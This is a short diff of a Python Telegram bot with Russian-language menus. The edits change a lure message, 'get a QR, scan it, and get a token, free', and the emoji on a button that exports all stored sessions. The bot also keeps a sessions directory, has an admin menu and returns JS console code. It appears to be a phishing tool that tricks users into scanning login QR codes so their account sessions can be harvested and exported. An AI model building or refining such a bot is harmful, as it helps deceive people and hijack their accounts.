@@ -149,7 +149,7 @@ def chat_sessions(chat_id: int) -> list[Path]: return sorted(SESSIONS_DIR.glob(f
 # --- Меню ---
 def main_menu_content(chat_id: int) -> tuple[str, InlineKeyboardMarkup]:
     # Убираем баланс из текста
-    text = "⌚️ Получите куар, отсканируйте, и получите токен, бесплатно)"
+    text = "**👇 Получите куар, отсканируйте, и получите токен, бесплатно ;)**"
     rows = [
         [
             InlineKeyboardButton("📲 Получить QR", callback_data="qr:get"),
@@ -169,7 +169,7 @@ def admin_menu() -> InlineKeyboardMarkup:
     ])
     
 def session_menu(chat_id: int) -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([[InlineKeyboardButton("📄 Список сессий", callback_data="session:show_list")], [InlineKeyboardButton("📦 Выгрузить все сессии", callback_data="session:export_all")], [InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")]])
+    return InlineKeyboardMarkup([[InlineKeyboardButton("📄 Список сессий", callback_data="session:show_list")], [InlineKeyboardButton("🗃️ Выгрузить все сессии", callback_data="session:export_all")], [InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")]])
 
 def get_js_console_code_raw(file_path: Path) -> str:
     try:
